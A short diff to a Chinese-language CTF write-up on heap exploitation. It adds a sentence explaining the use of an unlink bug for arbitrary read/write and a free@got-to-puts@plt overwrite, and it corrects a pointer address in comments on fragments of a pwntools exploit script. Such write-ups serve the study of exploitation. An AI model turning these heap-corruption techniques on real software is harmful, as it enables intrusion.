@@ -15,6 +15,7 @@ PIE                           : No
 Fortify                       : No
 RelRO                         : Partial
 ```
+和shellman不同的是，程序中不提供输出的函数，所以需要通过unlink漏洞实现任意地址读写，修改free@got为puts@plt。
 
 ### 程序基本功能
 程序存在 4 个功能，经过 IDA 分析后可以分析功能如下
@@ -37,7 +38,7 @@ RelRO                         : Partial
         payload += p64(0x30)              #chunk3
         payload += p64(0x90)
         edit(2,payload)
-        free(3)   # 0x602140 -> 0x602138
+        free(3)   # 0x602150 -> 0x602138
 
 ```
   free(3)之后，获得了一个可控的指针0x602150 -> 0x602138
@@ -109,7 +110,7 @@ def exp():
 	payload += p64(0x90)
 
 	edit(2,payload)
-	free(3)   # 0x602140 -> 0x602138
+	free(3)   # 0x602150 -> 0x602138
 	gdb.attach(p)
 	raw_input()
 	p.recvuntil('OK\n')
